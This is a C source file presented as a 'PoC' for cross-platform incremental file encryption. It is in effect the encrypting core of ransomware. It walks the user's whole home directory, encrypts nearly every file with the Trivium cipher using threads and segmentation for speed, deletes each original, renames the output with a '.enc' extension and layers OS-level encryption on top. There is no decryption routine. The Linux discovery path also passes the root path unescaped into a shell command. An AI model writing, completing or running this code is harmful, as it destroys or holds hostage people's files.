/*
 * PoC: Cross-platform incremental file encryption with Trivium cipher,
 *       file-system index fallback, OS-level encryption, parallelism,
 *       large-file segmentation, and atomic replacement.
 *
 * Configuration parameters are at the top of this file.
 */

#define _XOPEN_SOURCE 500   /* for nftw on Linux */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <sys/stat.h>

#ifdef _WIN32
  #include <windows.h>
  #include <shlobj.h>
  #include <io.h>
  #include <fcntl.h>
  #define PATH_SEP '\\'
  #define MAX_PATH_LEN MAX_PATH
  #define open  _open
  #define close _close
  #define remove _unlink
#else
  #include <ftw.h>
  #include <pthread.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <sys/ioctl.h>
  #include <linux/fs.h>
  #define PATH_SEP '/'
  #define MAX_PATH_LEN 4096
#endif

/* Include your Trivium cipher implementation */
#include "wip_trivium_2304.c"

/*—— Configuration ——*/
#define EXTENSION               ".enc"         /* user-defined encrypted extension */
#define NUM_THREADS             4              /* default number of producer threads */
#define KEY_HEX                 "0123456789ABCDEF0123" /* 80-bit key in hex */
#define TEMP_SUFFIX_MIN         2              /* random suffix length in bytes */
#define TEMP_SUFFIX_MAX         24             /* random suffix length in bytes */

/* Extensions to skip (never encrypt these) */
#define NUM_EXCLUDED_EXTS       3
static const char *EXCLUDED_EXTS[NUM_EXCLUDED_EXTS] = {
    ".c",
    ".h",
    ".exe"
};

/* Large-file threshold (in MB): files > this will be segmented */
#define LARGE_FILE_THRESHOLD_MB 50
/*———————————————————*/

typedef struct file_node {
    char *path;
    struct file_node *next;
} file_node_t;

typedef struct {
    file_node_t *head, *tail;
    int done;
#ifdef _WIN32
    CRITICAL_SECTION cs;
    CONDITION_VARIABLE  cv;
#else
    pthread_mutex_t     mutex;
    pthread_cond_t      cond;
#endif
} queue_t;

static queue_t file_queue;

/* Forward declarations */
static void queue_init(queue_t *q);
static void queue_push(queue_t *q, const char *path);
static char *queue_pop(queue_t *q);
static void queue_done(queue_t *q);

static void *worker_thread(void *arg);
static void traverse_with_index(const char *root);
static void traverse_recursive(const char *path);

static int  process_file(const char *filepath);
static int  process_large_file(const char *filepath);
static void *block_worker(void *arg);
static void os_encrypt_file(const char *path);
static void generate_random_hex(char *out, int byte_len);

/* Portable pread/pwrite for offset I/O */
#ifdef _WIN32
static ssize_t portable_pread(int fd, void *buf, size_t cnt, off_t off) {
    HANDLE h = (HANDLE)_get_osfhandle(fd);
    OVERLAPPED ov = {0};
    ov.Offset     = (DWORD)(off & 0xFFFFFFFF);
    ov.OffsetHigh = (DWORD)((off >> 32)&0xFFFFFFFF);
    DWORD got;
    if (!ReadFile(h, buf, (DWORD)cnt, &got, &ov)) return -1;
    return got;
}
static ssize_t portable_pwrite(int fd, const void *buf, size_t cnt, off_t off) {
    HANDLE h = (HANDLE)_get_osfhandle(fd);
    OVERLAPPED ov = {0};
    ov.Offset     = (DWORD)(off & 0xFFFFFFFF);
    ov.OffsetHigh = (DWORD)((off >> 32)&0xFFFFFFFF);
    DWORD wrote;
    if (!WriteFile(h, buf, (DWORD)cnt, &wrote, &ov)) return -1;
    return wrote;
}
#else
static ssize_t portable_pread(int fd, void *buf, size_t cnt, off_t off) {
    return pread(fd, buf, cnt, off);
}
static ssize_t portable_pwrite(int fd, const void *buf, size_t cnt, off_t off) {
    return pwrite(fd, buf, cnt, off);
}
#endif

/*—— Queue implementation ——*/
static void queue_init(queue_t *q) {
    q->head = q->tail = NULL;
    q->done = 0;
#ifdef _WIN32
    InitializeCriticalSection(&q->cs);
    InitializeConditionVariable(&q->cv);
#else
    pthread_mutex_init(&q->mutex, NULL);
    pthread_cond_init(&q->cond, NULL);
#endif
}
static void queue_push(queue_t *q, const char *path) {
    file_node_t *node = malloc(sizeof(*node));
    if (!node) return;
    node->path = strdup(path);
    node->next = NULL;
#ifdef _WIN32
    EnterCriticalSection(&q->cs);
    if (q->tail) q->tail->next = node;
    else         q->head = node;
    q->tail = node;
    WakeConditionVariable(&q->cv);
    LeaveCriticalSection(&q->cs);
#else
    pthread_mutex_lock(&q->mutex);
    if (q->tail) q->tail->next = node;
    else         q->head = node;
    q->tail = node;
    pthread_cond_signal(&q->cond);
    pthread_mutex_unlock(&q->mutex);
#endif
}
static char *queue_pop(queue_t *q) {
    file_node_t *node;
    char *path;
#ifdef _WIN32
    EnterCriticalSection(&q->cs);
    while (!q->head && !q->done)
        SleepConditionVariableCS(&q->cv, &q->cs, INFINITE);
    if (!q->head) { LeaveCriticalSection(&q->cs); return NULL; }
    node = q->head;
    q->head = node->next;
    if (!q->head) q->tail = NULL;
    LeaveCriticalSection(&q->cs);
#else
    pthread_mutex_lock(&q->mutex);
    while (!q->head && !q->done)
        pthread_cond_wait(&q->cond, &q->mutex);
    if (!q->head) { pthread_mutex_unlock(&q->mutex); return NULL; }
    node = q->head;
    q->head = node->next;
    if (!q->head) q->tail = NULL;
    pthread_mutex_unlock(&q->mutex);
#endif
    path = node->path;
    free(node);
    return path;
}
static void queue_done(queue_t *q) {
#ifdef _WIN32
    EnterCriticalSection(&q->cs);
    q->done = 1;
    WakeAllConditionVariable(&q->cv);
    LeaveCriticalSection(&q->cs);
#else
    pthread_mutex_lock(&q->mutex);
    q->done = 1;
    pthread_cond_broadcast(&q->cond);
    pthread_mutex_unlock(&q->mutex);
#endif
}

/*—— Worker thread ——*/
static void *worker_thread(void *arg) {
    (void)arg;
    for (;;) {
        char *path = queue_pop(&file_queue);
        if (!path) break;
        process_file(path);
        free(path);
    }
    return NULL;
}

/*—— File discovery: try system index, else recursive ——*/
static void traverse_with_index(const char *root) {
#ifdef __linux__
    char cmd[MAX_PATH_LEN + 64];
    snprintf(cmd, sizeof(cmd),
             "locate -r '^%s/.*' -0 2>/dev/null", root);
    FILE *pipe = popen(cmd, "r");
    if (pipe) {
        char buf[MAX_PATH_LEN];
        int idx = 0, c;
        while ((c = fgetc(pipe)) != EOF) {
            if (c == '\0') {
                buf[idx] = '\0';
                queue_push(&file_queue, buf);
                idx = 0;
            } else if (idx < (int)sizeof(buf)-1) {
                buf[idx++] = c;
            }
        }
        pclose(pipe);
        return;
    }
#endif
    traverse_recursive(root);
}

#ifdef __linux__
static int nftw_cb(const char *fpath, const struct stat *sb,
                   int typeflag, struct FTW *ftwbuf) {
    (void)sb; (void)ftwbuf;
    if (typeflag == FTW_F)
        queue_push(&file_queue, fpath);
    return 0;
}
static void traverse_recursive(const char *path) {
    nftw(path, nftw_cb, 16, 0);
}
#else
static void traverse_recursive_windows(const char *dir) {
    char pattern[MAX_PATH_LEN];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileExA(
        pattern,
        FindExInfoBasic,
        &fd,
        FindExSearchNameMatch,
        NULL,
        0
    );
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (strcmp(fd.cFileName, ".")==0 ||
            strcmp(fd.cFileName, "..")==0) continue;
        char child[MAX_PATH_LEN];
        snprintf(child, sizeof(child),
                 "%s\\%s", dir, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            traverse_recursive_windows(child);
        else
            queue_push(&file_queue, child);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}
static void traverse_recursive(const char *path) {
    traverse_recursive_windows(path);
}
#endif

/*—— Encrypt one file (dispatch large/small) ——*/
static int process_file(const char *filepath) {
    struct stat st;
    if (stat(filepath, &st) != 0) return -1;

    /* Skip excluded extensions */
    size_t len = strlen(filepath);
    for (int i = 0; i < NUM_EXCLUDED_EXTS; i++) {
        size_t elen = strlen(EXCLUDED_EXTS[i]);
        if (len > elen &&
            strcmp(filepath + len - elen, EXCLUDED_EXTS[i])==0)
            return 0;
    }

    /* Skip already encrypted */
    size_t extlen = strlen(EXTENSION);
    if (len > extlen &&
        strcmp(filepath + len - extlen, EXTENSION)==0)
        return 0;

    /* Large-file path */
    if (st.st_size > (off_t)LARGE_FILE_THRESHOLD_MB * 1024 * 1024)
        return process_large_file(filepath);

    /* Single-pass encryption */
    int suffix_bytes = (rand() % (TEMP_SUFFIX_MAX - TEMP_SUFFIX_MIN + 1))
                       + TEMP_SUFFIX_MIN;
    char hexsuffix[TEMP_SUFFIX_MAX*2 + 1];
    generate_random_hex(hexsuffix, suffix_bytes);

    char tmp[MAX_PATH_LEN + strlen(EXTENSION) + TEMP_SUFFIX_MAX*2 + 8];
    char enc[MAX_PATH_LEN + strlen(EXTENSION) + 1];
    snprintf(tmp, sizeof(tmp), "%s%s.%s.tmp",
             filepath, EXTENSION, hexsuffix);
    snprintf(enc, sizeof(enc), "%s%s",
             filepath, EXTENSION);

    /* Parse key */
    unsigned char keybuf[KEY_BITS/8];
    if (parse_key(KEY_HEX, keybuf) != 0) return -1;

    /* Open input and output */
    FILE *fin  = fopen(filepath, "rb");
    FILE *fout = fopen(tmp,     "wb");
    if (!fin || !fout) {
        if (fin)  fclose(fin);
        if (fout) fclose(fout);
        return -1;
    }

    /* Write IV */
    unsigned char ivbuf[IV_BITS/8];
    if (generate_random_bytes(ivbuf, sizeof(ivbuf)) != 0) {
        fclose(fin); fclose(fout);
        return -1;
    }
    fwrite(ivbuf, 1, sizeof(ivbuf), fout);

    /* Trivium encrypt */
    {
        int state[STATE_SIZE];
        int kb[KEY_BITS], vb[IV_BITS];
        bytes_to_bits(keybuf, sizeof(keybuf), kb);
        bytes_to_bits(ivbuf,  sizeof(ivbuf),    vb);
        trivium_init(state, kb, vb);

        unsigned char buf[BLOCK_SIZE];
        size_t r;
        while ((r = fread(buf,1,BLOCK_SIZE,fin)) > 0) {
            for (size_t i = 0; i < r; i++)
                buf[i] ^= get_keystream_byte(state);
            fwrite(buf,1,r,fout);
        }
        secure_clear(state, sizeof(state));
    }

    fclose(fin);
    fclose(fout);
    secure_clear(keybuf, sizeof(keybuf));

    /* Atomic replace */
  #ifdef _WIN32
    MoveFileExA(tmp, enc, MOVEFILE_REPLACE_EXISTING);
  #else
    rename(tmp, enc);
  #endif

    /* Remove original and apply OS-level encryption */
    remove(filepath);
    os_encrypt_file(enc);

    return 0;
}

/*—— Process large file by splitting into 4-block segments ——*/
typedef struct {
    const char *filepath;
    char        tmp_path[MAX_PATH_LEN];
    unsigned char key[KEY_BITS/8];
    unsigned char iv [IV_BITS/8];
    off_t       start_block;
    size_t      num_blocks;
    off_t       total_size;
} block_args_t;

#ifdef _WIN32
static DWORD WINAPI block_worker_win(LPVOID arg) {
    block_worker(arg);
    return 0;
}
#endif

static int process_large_file(const char *filepath) {
    struct stat st;
    if (stat(filepath, &st) != 0) return -1;
    off_t total_size = st.st_size;

    /* Generate temp and enc names */
    int suffix_bytes = (rand() % (TEMP_SUFFIX_MAX - TEMP_SUFFIX_MIN + 1))
                       + TEMP_SUFFIX_MIN;
    char hexsuffix[TEMP_SUFFIX_MAX*2 + 1];
    generate_random_hex(hexsuffix, suffix_bytes);

    char tmp[MAX_PATH_LEN + TEMP_SUFFIX_MAX*2 + 16];
    char enc[MAX_PATH_LEN + strlen(EXTENSION) + 1];
    snprintf(tmp, sizeof(tmp), "%s%s.%s.tmp",
             filepath, EXTENSION, hexsuffix);
    snprintf(enc, sizeof(enc), "%s%s",
             filepath, EXTENSION);

    /* Parse key & generate IV */
    unsigned char keybuf[KEY_BITS/8], ivbuf[IV_BITS/8];
    if (parse_key(KEY_HEX, keybuf)!=0)               return -1;
    if (generate_random_bytes(ivbuf, sizeof(ivbuf))!=0) return -1;

    /* Open temp file and write IV */
  #ifdef _WIN32
    int tmp_fd = _open(tmp,
                       _O_CREAT|_O_RDWR|_O_BINARY,
                       _S_IREAD|_S_IWRITE);
  #else
    int tmp_fd = open(tmp, O_CREAT|O_RDWR, 0600);
  #endif
    if (tmp_fd < 0) return -1;
    if (portable_pwrite(tmp_fd, ivbuf, sizeof(ivbuf), 0)
        != (ssize_t)sizeof(ivbuf)) {
        close(tmp_fd);
        return -1;
    }

    /* Compute number of blocks & threads */
    off_t num_blocks     = (total_size + BLOCK_SIZE - 1) / BLOCK_SIZE;
    size_t threads_needed= (num_blocks + 4 - 1) / 4;

  #ifdef _WIN32
    HANDLE *threads = malloc(sizeof(HANDLE) * threads_needed);
  #else
    pthread_t *threads = malloc(sizeof(pthread_t) * threads_needed);
  #endif

    /* Spawn one worker per 4-block slice */
    for (size_t i = 0; i < threads_needed; i++) {
        block_args_t *arg = malloc(sizeof(*arg));
        arg->filepath    = filepath;
        strcpy(arg->tmp_path, tmp);
        memcpy(arg->key, keybuf, sizeof(keybuf));
        memcpy(arg->iv,  ivbuf,  sizeof(ivbuf));
        arg->start_block = i * 4;
        arg->num_blocks  = ((i*4 + 4) <= num_blocks)
                            ? 4
                            : (size_t)(num_blocks - i*4);
        arg->total_size  = total_size;

      #ifdef _WIN32
        threads[i] = CreateThread(
            NULL,0,block_worker_win,arg,0,NULL
        );
      #else
        pthread_create(&threads[i], NULL, block_worker, arg);
      #endif
    }

    /* Join workers */
  #ifdef _WIN32
    WaitForMultipleObjects((DWORD)threads_needed,
                           threads, TRUE, INFINITE);
    for (size_t i = 0; i < threads_needed; i++)
        CloseHandle(threads[i]);
    free(threads);
  #else
    for (size_t i = 0; i < threads_needed; i++)
        pthread_join(threads[i], NULL);
    free(threads);
  #endif

    close(tmp_fd);

    /* Atomic replace and cleanup */
  #ifdef _WIN32
    MoveFileExA(tmp, enc, MOVEFILE_REPLACE_EXISTING);
  #else
    rename(tmp, enc);
  #endif
    remove(filepath);
    os_encrypt_file(enc);

    return 0;
}

/*—— Worker that encrypts a slice of blocks ——*/
static void *block_worker(void *arg) {
    block_args_t *a = arg;

  #ifdef _WIN32
    int in_fd  = _open(a->filepath,
                       _O_RDONLY|_O_BINARY);
    int tmp_fd = _open(a->tmp_path,
                       _O_RDWR  |_O_BINARY);
  #else
    int in_fd  = open(a->filepath, O_RDONLY);
    int tmp_fd = open(a->tmp_path,  O_RDWR);
  #endif
    if (in_fd < 0 || tmp_fd < 0) {
        free(a);
        return NULL;
    }

    unsigned char buf[BLOCK_SIZE];
    for (size_t b = 0; b < a->num_blocks; b++) {
        off_t block_idx = a->start_block + b;
        off_t offset    = block_idx * BLOCK_SIZE;
        size_t chunk_sz = (offset + BLOCK_SIZE > a->total_size)
                          ? (size_t)(a->total_size - offset)
                          : BLOCK_SIZE;

        /* Initialize Trivium state */
        int state[STATE_SIZE];
        int kb[KEY_BITS], vb[IV_BITS];
        bytes_to_bits(a->key, sizeof(a->key), kb);
        bytes_to_bits(a->iv,  sizeof(a->iv),  vb);
        trivium_init(state, kb, vb);

        /* Skip keystream to the block start */
        for (off_t i = 0; i < offset; i++)
            get_keystream_byte(state);

        /* Read plaintext */
        if (portable_pread(in_fd, buf, chunk_sz, offset)
            != (ssize_t)chunk_sz)
            continue;

        /* Encrypt */
        for (size_t i = 0; i < chunk_sz; i++)
            buf[i] ^= get_keystream_byte(state);
        secure_clear(state, sizeof(state));

        /* Write ciphertext after IV */
        portable_pwrite(tmp_fd, buf, chunk_sz,
                        (off_t)(IV_BITS/8) + offset);
    }

  #ifdef _WIN32
    _close(in_fd);
    _close(tmp_fd);
  #else
    close(in_fd);
    close(tmp_fd);
  #endif
    free(a);
    return NULL;
}

/*—— OS-level encryption invocation ——*/
static void os_encrypt_file(const char *path) {
#ifdef _WIN32
    wchar_t wpath[MAX_PATH_LEN];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH_LEN);
    EncryptFileW(wpath);
#else
    int fd = open(path, O_RDONLY);
    if (fd >= 0) {
        ioctl(fd, FS_IOC_ENABLE_ENCRYPTION, 0);
        close(fd);
    }
#endif
}

/*—— Generate random hex suffix ——*/
static void generate_random_hex(char *out, int byte_len) {
    unsigned char buf[TEMP_SUFFIX_MAX];
    generate_random_bytes(buf, byte_len);
    for (int i = 0; i < byte_len; i++)
        sprintf(out + i*2, "%02X", buf[i]);
    out[byte_len*2] = '\0';
}

/*—— Main entry point ——*/
int main(void) {
    srand((unsigned)time(NULL));

    /* Determine user’s home/profile directory */
    char root[MAX_PATH_LEN];
#ifdef _WIN32
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, root) != S_OK)
        strcpy(root, getenv("USERPROFILE"));
#else
    char *h = getenv("HOME");
    if (h) strncpy(root, h, sizeof(root));
    else  strncpy(root, "/", sizeof(root));
#endif

    /* Initialize queue and producer workers */
    queue_init(&file_queue);
#ifdef _WIN32
    HANDLE producers[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++)
        producers[i] = CreateThread(NULL, 0,
                                   (LPTHREAD_START_ROUTINE)worker_thread,
                                   NULL, 0, NULL);
#else
    pthread_t producers[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++)
        pthread_create(&producers[i], NULL,
                       worker_thread, NULL);
#endif

    /* Start discovery */
    traverse_with_index(root);

    /* Signal end and wait for workers */
    queue_done(&file_queue);
#ifdef _WIN32
    WaitForMultipleObjects(NUM_THREADS, producers, TRUE, INFINITE);
    for (int i = 0; i < NUM_THREADS; i++)
        CloseHandle(producers[i]);
#else
    for (int i = 0; i < NUM_THREADS; i++)
        pthread_join(producers[i], NULL);
#endif

    return 0;
}
